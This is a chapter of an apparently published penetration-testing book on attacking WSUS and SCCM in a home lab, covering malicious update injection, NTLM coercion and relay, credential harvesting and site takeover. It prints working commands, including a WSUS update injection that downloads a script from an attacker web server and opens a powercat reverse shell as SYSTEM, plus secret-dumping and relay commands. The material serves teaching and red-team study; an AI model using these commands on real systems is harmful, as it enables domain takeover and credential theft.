<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer298">
<h1 class="chapter-number" id="_idParaDest-205"><a id="_idTextAnchor222"/>10</h1>
<h1 id="_idParaDest-206"><a id="_idTextAnchor223"/>Taking Over WSUS and SCCM</h1>
<p>In this final chapter of the book, we will focus on attacking infrastructure management solutions. These are valuable and attractive targets for an adversary as such systems are operated under highly privileged accounts with access to almost every piece of the target environment. <strong class="bold">Windows Server Update Services</strong> (<strong class="bold">WSUS</strong>) is<a id="_idIndexMarker960"/> a service to deploy updates to the client computers in a centralized manner. <strong class="bold">Microsoft Endpoint Configuration Management</strong> (<strong class="bold">MECM</strong>) – formerly<a id="_idIndexMarker961"/> known as <strong class="bold">System Center Configuration Manager</strong> (<strong class="bold">SCCM</strong>) – is<a id="_idIndexMarker962"/> an on-premises management solution for endpoints. This product helps IT professionals run system inventory, patching, software deployment, and <span class="No-Break">so on.</span></p>
<p>We will start by discussing known attacks on WSUS and then show how it can be abused for lateral movement. However, the main focus of this chapter is on SCCM. After the introduction and necessary theory, we will move on to the deployment stage. When our lab is ready, it is time to go through the kill chain one more time: reconnaissance, privilege escalation, and lateral movement. As usual, our main attention will be on the service-specific techniques. We will finish the chapter with <span class="No-Break">defensive recommendations.</span></p>
<p>In this chapter, we are going to cover the following <span class="No-Break">main topics:</span></p>
<ul>
<li><span class="No-Break">Abusing WSUS</span></li>
<li>Introduction to and deployment <span class="No-Break">of MECM/SCCM</span></li>
<li><span class="No-Break">Reconnaissance</span></li>
<li><span class="No-Break">Privilege escalation</span></li>
<li><span class="No-Break">Lateral movement</span></li>
<li><span class="No-Break">Defensive recommendations</span></li>
</ul>
<h1 id="_idParaDest-207"><a id="_idTextAnchor224"/>Technical requirements</h1>
<p>In this chapter, you will need to have access to <span class="No-Break">the following:</span></p>
<ul>
<li>VMware Workstation or Oracle VirtualBox with at least 16 GB of RAM, 8 CPU cores, and at least 55 GB of total space (more if you <span class="No-Break">take snapshots)</span></li>
<li>Linux-based operating system is <span class="No-Break">strongly recommended</span></li>
<li>From GOADv2 project we will use <span class="No-Break">DC01, SRV01</span></li>
<li>From DetectionLab we will use DC, <span class="No-Break">WEF, Win10.</span></li>
</ul>
<h1 id="_idParaDest-208"><a id="_idTextAnchor225"/>Abusing WSUS</h1>
<p>In most corporate <a id="_idIndexMarker963"/>environments, updates are distributed and installed centrally by administrators. For Windows-based infrastructure, the way to go is to install a WSUS server role on one of the servers in the network and force clients and servers to use it as a source of updates. WSUS can help to eliminate risks related to missing patches but can also be a target for compromise. The reason is simple: attackers can use it to distribute malicious code that will be automatically downloaded and installed and looks legitimate and trustworthy. Clients will get all the required information about the WSUS server by querying the registry key values in <strong class="source-inline">HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate</strong>. In essence, WSUS is <a id="_idIndexMarker964"/>a <strong class="bold">Simple Object Access Protocol</strong> (<strong class="bold">SOAP</strong>) XML web service. All updates must be signed by Microsoft, and WSUS checks the digital signature and hash of every update. However, <strong class="bold">Transport Layer Security</strong> (<strong class="bold">TLS</strong>) is not<a id="_idIndexMarker965"/> enabled by default, opening the first opportunity <span class="No-Break">for compromise.</span></p>
<p>Unencrypted communication can lead to <a id="_idIndexMarker966"/>a <strong class="bold">Man-in-the-Middle</strong> (<strong class="bold">MitM</strong>) attack depending on the attacker’s position in the network. Firstly, we need to check the <strong class="source-inline">WUServer</strong> registry value for the HTTP protocol presence, which means that TLS is not in use and the attack is possible Then, we can try to perform <strong class="bold">Address Resolution Protocol</strong> (<strong class="bold">ARP</strong>) spoofing<a id="_idIndexMarker967"/> and deliver a signed binary such<a id="_idIndexMarker968"/> as <strong class="source-inline">PsExec</strong>. The attack consists of two parts – MitM and distribution. <strong class="bold">GoSecure</strong> developed<a id="_idIndexMarker969"/> a malicious update distribution tool<a id="_idIndexMarker970"/> called <strong class="bold">PyWSUS</strong>[1]. To carry out the MitM attack, <strong class="bold">bettercap</strong>[2] was <a id="_idIndexMarker971"/>recommended in <span class="No-Break">the research[3].</span></p>
<p>Another vector <a id="_idIndexMarker972"/>we should not miss is vulnerabilities in the client itself. For example, CVE-2020-1013 allows us to modify local user proxy settings, so we can run <strong class="source-inline">PyWSUS</strong> locally, executing code with <strong class="source-inline">SYSTEM</strong> privileges on the machine. The tool to run this attack – called <strong class="bold">WSuspicious</strong> – was<a id="_idIndexMarker973"/> published in the <em class="italic">GoSecure </em><span class="No-Break">GitHub repository[4].</span></p>
<p>Also, if we target any Windows-based environment, the <strong class="bold">New Technology LAN Manager</strong> (<strong class="bold">NTLM</strong>) relay attack<a id="_idIndexMarker974"/> is always somewhere nearby. As discussed previously, we can redirect the client’s WSUS requests toward a malicious WSUS server, so nothing stops us from requesting NTLM authentication and the client will automat<a id="_idTextAnchor226"/>ically <span class="No-Break">do so.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">This technique is described by <em class="italic">GoSecure</em> <span class="No-Break">here: </span><a href="https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/"><span class="No-Break">https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/</span></a><span class="No-Break">.</span></p>
<p>The main takeaway from all the attacks so far described is to enforce WSUS updates only over secure <span class="No-Break">HTTPS transport.</span></p>
<p>The last attack in our scope is the distribution of malicious updates to the client if the attacker has compromised the <a id="_idIndexMarker975"/>WSUS server itself. For this purpose, we will deploy WSUS on <strong class="source-inline">castelrock.sevenkingdoms.local</strong> and install a malicious update on <strong class="source-inline">kingslanding.sevenkingdoms.local</strong>, getting a reverse shell. We need to deploy WSUS in our lab following the guide provided <span class="No-Break">by Microsoft[5].</span></p>
<p>Role installation is straightforward. The next step is service configuration. We will untick all OS versions and software in the suggested update target list as we do not want WSUS to pull updates from the internet. Lastly, we need to configure Group Policy, so the <strong class="bold">domain controller</strong> (<strong class="bold">DC</strong>) will<a id="_idIndexMarker976"/> pull updates from WSUS[6]. It is important to mention that we must use a <strong class="bold">fully qualified domain name</strong> (<strong class="bold">FQDN</strong>) with a port number for the <a id="_idIndexMarker977"/>WSUS server in the Group <span class="No-Break">Policy parameter.</span></p>
<p>To compromise<a id="_idIndexMarker978"/> the DC, we can utilize <a id="_idIndexMarker979"/>the <strong class="bold">SharpWSUS</strong>[7] or <strong class="bold">wsuspendu</strong>[8] tools. The plan is to host a reverse shell script on our web server, and download and execute it by <a id="_idIndexMarker980"/>using <strong class="source-inline">PsExec</strong>[9] as a payload (as it is signed <span class="No-Break">by Microsoft):</span></p>
<pre class="console">
.\wsuspendu.ps1 -Inject -PayloadFile .\ps64.exe -PayloadArgs 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.56.150:8000/powercat.ps1'');powercat -c 192.168.56.150 -p 443 -e cmd"'
Get-WsusUpdate -Approval Unapproved |Approve-WsusUpdate -Action Inst<a id="_idTextAnchor227"/>all -TargetGroupName "DC"</pre> <p>Then, the update is<a id="_idIndexMarker981"/> installed on the DC, and we obtain the reverse shell <span class="No-Break">as </span><span class="No-Break"><strong class="source-inline">SYSTEM</strong></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer281">
<img alt="Figure 10.1 – Reverse shell on the DC as SYSTEM" height="568" src="image/B18964_10_01.jpg" width="536"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.1 – Reverse shell on the DC as SYSTEM</p>
<p>In this section, we <a id="_idIndexMarker982"/>discussed the most common compromise vectors for WSUS such as MitM, missing patches, and NTLM relay attacks. Also, we demonstrated how compromised WSUS can be abused for lateral movement, effectively giving the attacker the possibility of a complete <span class="No-Break">infrastructure takeover.</span></p>
<p>In the next section, we will start with systems management software developed by Microsoft. It is now called MECM, but we often still use the old name, which <span class="No-Break">is SCCM.</span></p>
<h1 id="_idParaDest-209"><a id="_idTextAnchor228"/>Introduction to MECM/SCCM</h1>
<p>SCCM is a<a id="_idIndexMarker983"/> complicated piece of software with its own hierarchy and terms. We will start with the required theory. In essence, SCCM utilizes client-server architecture, where an agent is installed on endpoints and then called back to <span class="No-Break">the server.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Hierarchy designs are described by Microsoft <span class="No-Break">here: </span><a href="https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites"><span class="No-Break">https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites</span></a><span class="No-Break">.</span></p>
<p>In our lab, we will deploy a single <a id="_idIndexMarker984"/>standalone <strong class="bold">primary site</strong>. The <strong class="bold">secondary site</strong> can be <a id="_idIndexMarker985"/>added for scalability purposes in a bigger environment. Also, if there are more than two primary sites, you will need a <strong class="bold">central administration site</strong>, which is<a id="_idIndexMarker986"/> used only for managing sites, not the clients. Every site has <a id="_idIndexMarker987"/>a three-letter <strong class="bold">site code</strong>. Clients are grouped in <strong class="bold">boundary groups</strong> based <a id="_idIndexMarker988"/>on, surprise, boundaries. Network range or <strong class="bold">Active Directory</strong> (<strong class="bold">AD</strong>) group membership<a id="_idIndexMarker989"/> are good examples of boundaries. Also, it is possible to perform discovery tasks and automatically assign clients to the group, depending on certain criteria. <strong class="bold">Management point</strong> (<strong class="bold">MP</strong>) is a <a id="_idIndexMarker990"/>role providing clients with policies and configurations to communicate with the site server. It is installed on the primary site server by default. Next, clients need to know the <strong class="bold">distribution point</strong> (<strong class="bold">DP</strong>) to<a id="_idIndexMarker991"/> be able to get updates, software, and so on. All information about the clients is stored on <a id="_idIndexMarker992"/>the <strong class="bold">site database server</strong>, which is Microsoft SQL Server. Communication between the primary server and the database is the responsibility of<a id="_idIndexMarker993"/> the <strong class="bold">SMS provider</strong> component. In our lab, we will install an SMS provider and database server on our primary site server. There is <a id="_idIndexMarker994"/>an excellent visualization dia<a id="_idTextAnchor229"/>gram of a <span class="No-Break">hierarchy[10] next:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer282">
<img alt="Figure 10.2 – Typical SCCM hierarchy" height="871" src="image/B18964_10_02.jpg" width="722"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.2 – Typical SCCM hierarchy</p>
<p>There are many ways to install clients on target machines in the boundary group. The default way is a <strong class="bold">client push installation</strong>. This uses <a id="_idIndexMarker995"/>client push installation accounts, which are service accounts with administrative rights on the computer. During installation, it authenticates using that account and installs the client. If there are a few accounts configured, the server will try to authenticate each of them, one by one. Another promising account from an adversary’s point of view is a <strong class="bold">Network Access Account</strong> (<strong class="bold">NAA</strong>). This <a id="_idIndexMarker996"/>account is utilized when a non-domain-joined client wants to access content from <span class="No-Break">a DP.</span></p>
<p>Our next task is to deploy SCCM in <strong class="source-inline">DetectionLab</strong>. I will install it on a <span class="No-Break">WEF machine.</span></p>
<h2 id="_idParaDest-210"><a id="_idTextAnchor230"/>Deployment</h2>
<p>Deployment <a id="_idIndexMarker997"/>is quite a lengthy process. I suggest having a 2–3-hour <a id="_idIndexMarker998"/>timeframe for adding CPU and memory to the WEF <span class="No-Break">virtual machine.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">To deploy SCCM, I used two resources. The first one is made by <em class="italic">Benoit Lecours</em> from System Center Dudes (<a href="https://www.systemcenterdudes.com/complete-sccm-installation-guide-and-configuration/">https://www.systemcenterdudes.com/complete-sccm-installation-guide-and-configuration/</a>) and the second one is an adapted version of the preceding one, by <span class="No-Break"><em class="italic">HTTP418</em></span><span class="No-Break"> (</span><a href="https://http418infosec.com/grow-your-own-sccm-lab"><span class="No-Break">https://http418infosec.com/grow-your-own-sccm-lab</span></a><span class="No-Break">).</span></p>
<p>I will not put a step-by-step guide here; however, I will briefly cover <span class="No-Break">my journey:</span></p>
<ol>
<li>On the WEF machine, enable the <strong class="bold">Windows Installer</strong> and <strong class="bold">Windows Module </strong><span class="No-Break"><strong class="bold">Installer</strong></span><span class="No-Break"> services.</span></li>
<li>Perform schema extension <span class="No-Break">using </span><span class="No-Break"><strong class="source-inline">extadsch.exe</strong></span><span class="No-Break">.</span></li>
<li>Create a container and accounts in AD as per the <span class="No-Break">HTTP418 guide.</span></li>
<li>Use <strong class="bold">Group Policy</strong> to push firewall rules and add a client push installation account to the local <strong class="source-inline">Administrators</strong> group on <span class="No-Break">target machines.</span></li>
<li>Install required <span class="No-Break">Windows features.</span></li>
<li>Install the<a id="_idIndexMarker999"/> Windows <strong class="bold">Assessment and Deployment </strong><span class="No-Break"><strong class="bold">Kit</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">ADK</strong></span><span class="No-Break">).</span></li>
<li>Install Microsoft SQL Server in <span class="No-Break">evaluation mode.</span></li>
<li>Set <span class="No-Break">required SPNs.</span></li>
<li>I skipped database creation and only enabled listening on the IP address for <span class="No-Break">SQL Server.</span></li>
<li>Install the evaluation version <span class="No-Break">of SCCM.</span></li>
</ol>
<p>After the installation<a id="_idIndexMarker1000"/> is complete, configuration is required. I followed the<a id="_idIndexMarker1001"/> guide and was finally able to run a script on a WIN10 computer, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer283">
<img alt="Figure 10.3 – Running a script on a WIN10 client from the configuration console" height="166" src="image/B18964_10_03.jpg" width="435"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.3 – Running a script on a WIN10 client from the configuration console</p>
<p>Now the deployment is over, we should have a minimal working environment for <span class="No-Break">attack simulation.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">A great review of the SCCM attack surface with nicely structured schema was created by <em class="italic">0xcsandker</em> in his blog post <span class="No-Break">here: </span><a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/"><span class="No-Break">https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/</span></a><span class="No-Break">.</span></p>
<p>As usual, our first step will be reconnaissance. We will focus on exploring SCCM infrastructure and <span class="No-Break">host enumeration.</span></p>
<h1 id="_idParaDest-211"><a id="_idTextAnchor231"/>Reconnaissance</h1>
<p>In this section, we will discuss reconnaissance, as well as enumeration. We will briefly cover how to identify<a id="_idIndexMarker1002"/> SCCM only with network access and then dive deeper into the <em class="italic">assume </em><span class="No-Break"><em class="italic">breach</em></span><span class="No-Break"> scenario.</span></p>
<p>To identify SCCM infrastructure from a non-domain-joined machine, the attacker may perform a simple port scan looking for TCP ports <strong class="source-inline">8530</strong> and <strong class="source-inline">8531</strong> (Software Update point), <strong class="source-inline">10123</strong> (Management point), and <strong class="source-inline">4022</strong> and <strong class="source-inline">1433</strong> (SQL Server). Also, the UDP port <strong class="source-inline">4011</strong> might be an indicator of<a id="_idIndexMarker1003"/> the <strong class="bold">Preboot Execution Environment</strong> (<strong class="bold">PXE</strong>) boot media being offered. SCCM can be deployed with or without a PXE offering <a id="_idIndexMarker1004"/>called <strong class="bold">Operating System Deployment</strong> (<strong class="bold">OSD</strong>). We do not have PXE deployed in our lab, but there are some promising vectors <span class="No-Break">to consider.</span></p>
<p>To check whether <a id="_idIndexMarker1005"/>PXE is available in the environment, there is a tool <a id="_idIndexMarker1006"/>called <strong class="bold">PXEThief</strong>[11]. This tool sends a DHCP discover request to search for PXE servers and fetch PXE boot files. If PXE media is encrypted, then the attacker needs to guess or crack the password to decrypt it. After decryption, the tool will parse files for NAA accounts and <a id="_idIndexMarker1007"/>credentials in <strong class="bold">task sequences</strong> or stored within <strong class="bold">collection variables</strong>. In OSD, there is a task sequence functionality. This functionality, in a <a id="_idIndexMarker1008"/>nutshell, is a defined list of steps to deploy the machine correctly. Some of the steps, such as <em class="italic">Task sequence domain join account</em>, will use domain user credentials. Also, collection variables in task sequence steps may use hardcoded credentials. The tool will extract these credentials for you. Alternatively, the attacker can wait till the OS installation begins and check the <strong class="source-inline">C:\Windows\panther\unattend\unattend.xml</strong> file for the set of <span class="No-Break">domain credentials.</span></p>
<p>A way to obtain NAA credentials was shown by <em class="italic">Raiona_ZA</em> during his DEFCON talk[12]. If <em class="italic">F8-Debugging</em> is not disabled, an adversary can invoke the <strong class="source-inline">SYSTEM</strong> shell by repeatedly pressing <em class="italic">F8</em>, then run a Visual Basic Script to dump environment variables and search there for <strong class="source-inline">_SMSTSReserved1</strong> (username) and <strong class="source-inline">_SMSTSReserved2</strong> (password) values. These are your <span class="No-Break">NAA credentials.</span></p>
<p>Now, let us do some hands-on<a id="_idIndexMarker1009"/> discovery and enumeration from the context of the compromised domain user. I will stick to<a id="_idIndexMarker1010"/> the <strong class="bold">SharpSCCM</strong>[13] tool made by <em class="italic">Mayyhem</em> throughout this chapter. We can find the SCCM MP and site code in two different ways – PowerShell and WMI (<strong class="source-inline">SharpSCCM</strong> <span class="No-Break">uses WMI):</span></p>
<pre class="console">
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
Get-WmiObject -Class SMS_Authority -Namespace root\CCM</pre> <p>The result of <a id="_idIndexMarker1011"/>the <strong class="source-inline">SharpSCCM</strong> command execution is <span class="No-Break">as follows:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer284">
<img alt="Figure 10.4 – SharpSCCM shows the MP and site name" height="366" src="image/B18964_10_04.jpg" width="954"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.4 – SharpSCCM shows the MP and site name</p>
<p>Also, the MP can be extracted<a id="_idIndexMarker1012"/> from logs that are stored in <strong class="source-inline">C:\Windows\CCM\Logs</strong> on the machine. <strong class="source-inline">SharpSCCM</strong> has the <a id="_idIndexMarker1013"/><span class="No-Break">following command:</span></p>
<pre class="console">
SharpSCCM.exe local triage</pre> <p>Probably the last thing that an adversary can do locally without administrative privileges is to examine previously executed scripts only if PowerShell logging is enabled. This will allow the retrieval of script content from a Windows event. The following PowerShell command will go through events in Windows PowerShell logs and look for event ID <strong class="source-inline">4104</strong> (<em class="italic">PowerShell Script </em><span class="No-Break"><em class="italic">Block Logging</em></span><span class="No-Break">):</span></p>
<pre class="console">
Get-WinEvent -ProviderName Microsoft-Windows-PowerShell | Where-Object Id -eq 4104 | fl</pre> <p>For example, we can see our preceding <span class="No-Break">reconnaissance command:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer285">
<img alt="Figure 10.5 – Result of the PowerShell logging" height="169" src="image/B18964_10_05.jpg" width="882"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.5 – Result of the PowerShell logging</p>
<p>Scripts executed from the primary site are stored on the client side in the <strong class="source-inline">C:\Windows\CCM\ScriptStore</strong> folder. But to read the content of the scripts in this folder, <strong class="source-inline">SYSTEM</strong> privileges <span class="No-Break">are required.</span></p>
<p>Also, we can try to pull files from the <strong class="source-inline">SCCMContentLib$</strong> share on the DP. There is a tool called <strong class="bold">CMLoot</strong>[14] that will<a id="_idIndexMarker1014"/> create a list of files on shares and <span class="No-Break">download them.</span></p>
<p>We will now move to the next section, which is about privilege <span class="No-Break">escalation techniques.</span></p>
<h1 id="_idParaDest-212"><a id="_idTextAnchor232"/>Privilege escalation</h1>
<p>This section will be focused on privilege<a id="_idIndexMarker1015"/> escalation via credential harvesting and authentication coercion. For harvesting, we will need a local <span class="No-Break">Administrator account.</span></p>
<h2 id="_idParaDest-213"><a id="_idTextAnchor233"/>Client push authentication coercion</h2>
<p>As we did in previous chapters, here, we <a id="_idIndexMarker1016"/>will split hash <a id="_idIndexMarker1017"/>capture and relay phases as well. Our goal is to coerce client push installation account authentication against our controlled machine to capture the <span class="No-Break">NTLM response.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">Coercion attacks were presented by <em class="italic">Mayyhem</em> in his blog post <span class="No-Break">at </span><a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a"><span class="No-Break">https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a</span></a><span class="No-Break">.</span></p>
<p>The important fact is that the attack does not require administrative privileges; the captured client push installation account’s NTLM response will grant administrative access to all other machines where such an account has been used. The main prerequisites are automatic client assignment for a boundary group, automatic site-wide push installation, and allowed connection fallback to NTLM. Also, we need to make sure the <strong class="bold">HTTPS Only</strong> option for communication security is not enabled. We have enforced all these options during <span class="No-Break">the configuration.</span></p>
<p>The attacker sends a new device registration request to the MP followed by a heartbeat <strong class="bold">Data Discovery Record</strong> (<strong class="bold">DDR</strong>) saying that<a id="_idIndexMarker1018"/> the client is not installed on the machine with a listener. The site server tries to install the client using the client push installation accounts and eventually its machine account. This attack is a part of <strong class="source-inline">SharpSCCM</strong> <span class="No-Break">as well:</span></p>
<pre class="console">
SharpSCCM.exe invoke client-push -t 192.168.56.100</pre> <p>On the client, the<a id="_idIndexMarker1019"/> attack looks like the<a id="_idIndexMarker1020"/> <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer286">
<img alt="Figure 10.6 – Step-by-step successful coercion attack" height="461" src="image/B18964_10_06.jpg" width="812"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.6 – Step-by-step successful coercion attack</p>
<p>On the controlled machine, we captured both NTLM responses for the client push installation account and the MP <span class="No-Break">computer account:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer287">
<img alt="Figure 10.7 – Captured NTLM responses" height="417" src="image/B18964_10_07.jpg" width="1581"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.7 – Captured NTLM responses</p>
<p>The administrator will detect such an attack because the IP address of our controlled machine will appear in the console, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer288">
<img alt="Figure 10.8 – Captured machine IP address appears in the console" height="67" src="image/B18964_10_08.jpg" width="716"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.8 – Captured machine IP address appears in the console</p>
<p>If we have <a id="_idIndexMarker1021"/>administrative privileges<a id="_idIndexMarker1022"/> on the MP, we can use the <strong class="source-inline">--as-admin</strong> option to perform cleanup <span class="No-Break">for us.</span></p>
<h2 id="_idParaDest-214"><a id="_idTextAnchor234"/>Credential harvesting</h2>
<p>We will focus on three <a id="_idIndexMarker1023"/>credential types here – device collection <a id="_idIndexMarker1024"/>variables, task sequence variables, and <span class="No-Break">NAA credentials.</span></p>
<p>What is device collection? In simple words, it is a<a id="_idIndexMarker1025"/> group of devices. There are some pre-defined groups, but we can also create our own. In the case of collection, we may add variables for specific purposes. Then, these variables can be used by task sequences. An adversary can extract them as well. First of all, let us add a collection variable. These are in <strong class="bold">Assets and Compliance</strong> | <strong class="bold">Device Collections</strong> | <strong class="bold">Choose your collection</strong> | <strong class="bold">Properties</strong>. The screenshot of my example is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer289">
<img alt="Figure 10.9 – Device collection variable" height="530" src="image/B18964_10_09.jpg" width="500"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.9 – Device collection variable</p>
<p>We have discussed task <a id="_idIndexMarker1026"/>sequences and NAA before. <strong class="source-inline">SharpSCCM</strong> can pull this information locally or remotely. Using WMI, the adversary queries blobs from different classes (<strong class="source-inline">CCM_CollectionVariable</strong>, <strong class="source-inline">CCM_TaskSequence</strong>, and <strong class="source-inline">CCM_NetworkAccessAccount</strong>) of the <strong class="source-inline">root\ccm\policy\Machine\ActualConfig</strong> WMI namespace. Another way is to extract blobs from<a id="_idIndexMarker1027"/> the <strong class="bold">Common Information Model</strong> (<strong class="bold">CIM</strong>) store. To get clear-text credentials, local administrator privileges are required because NAA credentials are protected with a DPAPI master key. Lastly, the remote option will<a id="_idIndexMarker1028"/> request a machine policy from the MP via HTTP and <span class="No-Break">decrypt secrets:</span></p>
<pre class="console">
SharpSCCM.exe local secrets -m wmi
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe get secrets</pre> <p>The result of the last command execution is in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer290">
<img alt="Figure 10.10 – Credential harvesting" height="1319" src="image/B18964_10_10.jpg" width="727"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.10 – Credential harvesting</p>
<p class="callout-heading">Note</p>
<p class="callout">Another way to obtain NAA depending on<a id="_idIndexMarker1029"/> the <strong class="bold">Machine Account Quota</strong> (<strong class="bold">MAQ</strong>) value was shown by <em class="italic">http418</em> in his blog post at – <a href="https://http418infosec.com/offensive-sccm-summary#Credential_Access_%E2%80%93_NAA"><span class="No-Break">https://http418infosec.com/offensive-sccm-summary#Credential_Access_%E2%80%93_NAA</span></a><span class="No-Break">.</span></p>
<p>In our next section, we will focus on ways to perform lateral movement based only on <span class="No-Break">SCCM infrastructure.</span></p>
<h1 id="_idParaDest-215"><a id="_idTextAnchor235"/>Lateral movement</h1>
<p>SCCM by design is<a id="_idIndexMarker1030"/> an excellent software for lateral movement. Agents are installed throughout the environment; highly privileged accounts are used to perform administrative tasks. Also, it is a good opportunity to blend in legitimate traffic and activities. We will start our discussion about lateral movement by extending coercion authentication to <span class="No-Break">relay attacks.</span></p>
<h2 id="_idParaDest-216"><a id="_idTextAnchor236"/>Client push authentication relay attack</h2>
<p>This attack is very similar to<a id="_idIndexMarker1031"/> the one we did in<a id="_idIndexMarker1032"/> the <em class="italic">Privilege escalation</em> section previously. The only difference is that this time, we would like to relay the captured NTLM response to another machine. (Just a reminder: the relay requires signing to be disabled). On the client side, the attack is exactly the same. On our listening machine, we <span class="No-Break">start </span><span class="No-Break"><strong class="source-inline">ntlmrelayx</strong></span><span class="No-Break">:</span></p>
<pre class="console">
impacket-ntlmrelayx -t 192.168.56.106 -smb2support</pre> <p>After enforcing the client push installation, we relayed it to the Exchange server and dumped SAM hashes, as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer291">
<img alt="Figure 10.11 – Successful NTLM relay attack" height="501" src="image/B18964_10_11.jpg" width="1485"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.11 – Successful NTLM relay attack</p>
<p>If the client push <a id="_idIndexMarker1033"/>installation account has not <a id="_idIndexMarker1034"/>been defined, then by default, the SCCM server’s machine account will be used to push clients. Obviously, this computer account has to be in the local <strong class="source-inline">Administrators</strong> group for every computer. In this scenario, the attack will be the same as previously; the only difference is the account that will be used for <span class="No-Break">the relay.</span></p>
<h2 id="_idParaDest-217"><a id="_idTextAnchor237"/>Site takeover</h2>
<p>There are two site takeover<a id="_idIndexMarker1035"/> techniques. Unfortunately, we will not be able to replicate them in our lab because SQL Server and the SMS provider role are installed on the primary <span class="No-Break">site server.</span></p>
<p>The first technique is based on the fact that the computer account of the primary site server should be in a local <strong class="source-inline">Administrators</strong> group for SQL Server and MP servers. Then, an adversary coerces NTLM authentication from the primary site server and relays it to SQL Server. Next, it is possible to grant a <strong class="source-inline">Full Administrator</strong> SCCM role using SQL queries; the <strong class="bold">sccmhunter</strong>[15] tool can also do this <span class="No-Break">for you.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">This technique is well-described in the <em class="italic">SCCM Site Takeover via Automatic Client Push Installation</em> blog post by <span class="No-Break"><em class="italic">Mayyhem</em></span><span class="No-Break">: </span><a href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1"><span class="No-Break">https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1</span></a><span class="No-Break">.</span></p>
<p>The second technique leverages the <strong class="source-inline">AdminService</strong> API for SCCM site takeover. This API is hosted by an SMS provider. Each provider has a local group called <strong class="source-inline">SMS Admins</strong>. By default, the primary site server computer account is a member of this group. Now, the takeover attack will be the same as the preceding one. Coerce authentication via any method you like, capture and relay the primary site computer account NTLM response to the <strong class="source-inline">AdminService</strong> API hosted <a id="_idIndexMarker1036"/>on the SMS provider, and add a user as <span class="No-Break"><strong class="source-inline">Full Administrator</strong></span><span class="No-Break">.</span></p>
<p class="callout-heading">Note</p>
<p class="callout">The original research by <em class="italic">Garrett Foster</em> can be found <span class="No-Break">here: </span><a href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf"><span class="No-Break">https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf</span></a><span class="No-Break">.</span></p>
<p>Both techniques work after default installation and require only network connectivity and standard <span class="No-Break">user credentials.</span></p>
<h2 id="_idParaDest-218"><a id="_idTextAnchor238"/>Abuse of Microsoft SQL Server</h2>
<p>After the site <a id="_idIndexMarker1037"/>takeover, or if an adversary obtained access to the Microsoft SQL Server that is used by the primary site, new venues are opened. First of all, it is possible to decrypt SCCM users’ credentials that are stored in the <strong class="source-inline">SC_UserAccount</strong> table. In our case, I will run the query using the SQL Server Management Studio. The query is <span class="No-Break">shown here:</span></p>
<pre class="console">
USE CM_WIN
SELECT UserName,Password FROM SC_UserAccount</pre> <p>Then, I will utilize the <strong class="bold">SCCMDecryptPoc</strong>[16] tool by <em class="italic">XPN</em>. The result of the decryption is <span class="No-Break">shown here:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer292">
<img alt="Figure 10.12 – Decrypted password of the sccm_cli_push account" height="227" src="image/B18964_10_12.jpg" width="498"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.12 – Decrypted password of the sccm_cli_push account</p>
